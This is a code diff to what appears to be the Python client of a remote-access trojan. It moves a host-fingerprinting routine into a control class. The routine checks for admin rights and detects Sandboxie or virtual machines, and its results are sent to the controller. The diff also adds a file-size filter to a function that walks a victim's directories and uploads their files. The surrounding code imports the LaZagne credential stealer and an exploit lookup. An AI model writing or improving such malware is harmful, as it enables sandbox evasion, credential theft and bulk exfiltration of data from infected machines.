@@ -43,30 +43,6 @@ from lazagne.config.run import run_lazagne
 from lazagne.config.constant import constant as lazagne_constant
 
 
-def get_info():
-    _hostname = socket.gethostname()
-    _platform = f"{platform.system()} {platform.release()}"
-
-    info = {"hostname": _hostname, "platform": _platform,
-            "architecture": platform.architecture(), "machine": platform.machine(), "processor": platform.processor(),
-            "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "exec_path": os.path.realpath(sys.argv[0])}
-
-    if platforms.OS == platforms.WINDOWS:
-        p = Persistence()
-
-        info["username"] = os.environ["USERNAME"]
-        info["platform"] += " (Sandboxie) " if p.detect_sandboxie() else ""
-        info["platform"] += " (Virtual Machine) " if p.detect_vm() else ""
-        info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
-        info["is_unix"] = False
-    else:
-        info["username"] = os.environ["USER"]
-        info["is_admin"] = bool(os.geteuid() == 0)
-        info["is_unix"] = True
-
-    return info
-
-
 class Control(metaclass=abc.ABCMeta):
     def __init__(self, _es):
         self.es = _es
@@ -84,6 +60,30 @@ class Control(metaclass=abc.ABCMeta):
     @abc.abstractmethod
     def lock(self):
         pass
+
+    def info(self):
+        _hostname = socket.gethostname()
+        _platform = f"{platform.system()} {platform.release()}"
+
+        info = {"hostname": _hostname, "platform": _platform,
+                "architecture": platform.architecture(), "machine": platform.machine(),
+                "processor": platform.processor(),
+                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "exec_path": os.path.realpath(sys.argv[0])}
+
+        if platforms.OS == platforms.WINDOWS:
+            p = Persistence()
+
+            info["username"] = os.environ["USERNAME"]
+            info["platform"] += " (Sandboxie) " if p.detect_sandboxie() else ""
+            info["platform"] += " (Virtual Machine) " if p.detect_vm() else ""
+            info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
+            info["is_unix"] = False
+        else:
+            info["username"] = os.environ["USER"]
+            info["is_admin"] = bool(os.geteuid() == 0)
+            info["is_unix"] = True
+
+        self.es.send_json(SUCCESS, info)
 
     def get_vuln(self, exploit_only):
         if platforms.OS == platforms.DARWIN:
@@ -214,7 +214,7 @@ class Control(metaclass=abc.ABCMeta):
             for it in os.scandir(tmp):
                 if not it.is_dir() and it.path.endswith(".txt"):
                     # send file using helper function
-                    self.send_file(it.path)
+                    self.upload(it.path)
                     return
 
             self.es.send_json(ERROR, "Error getting results file.")
@@ -358,7 +358,11 @@ class Control(metaclass=abc.ABCMeta):
         except Exception as e:
             self.es.send_json(ERROR, f"Error reading file {e}")
 
-    def upload_dir(self, _dir):
+    def upload_dir(self, param):
+        _dir = param['path']
+
+        max_size = param['size']
+
         _dir = os.path.normpath(_dir)
 
         if not os.path.isdir(_dir):
@@ -374,10 +378,19 @@ class Control(metaclass=abc.ABCMeta):
             # count total file size for determining progress
             for subdir, _, files in os.walk(_dir):
                 for _file in files:
-                    file_total_size += os.stat(os.path.join(subdir, _file)).st_size
+                    file_size = os.stat(os.path.join(subdir, _file)).st_size
+
+                    if not (max_size != -1 and file_size > max_size):
+                        file_total_size += file_size
 
             for subdir, _, files in os.walk(_dir):
                 for _file in files:
+
+                    file_size = os.stat(os.path.join(subdir, _file)).st_size
+
+                    if max_size != -1 and file_size > max_size:
+                        continue
+
                     _file = os.path.normpath(os.path.join(subdir, _file))
                     completed_size += os.stat(os.path.join(subdir, _file)).st_size
 
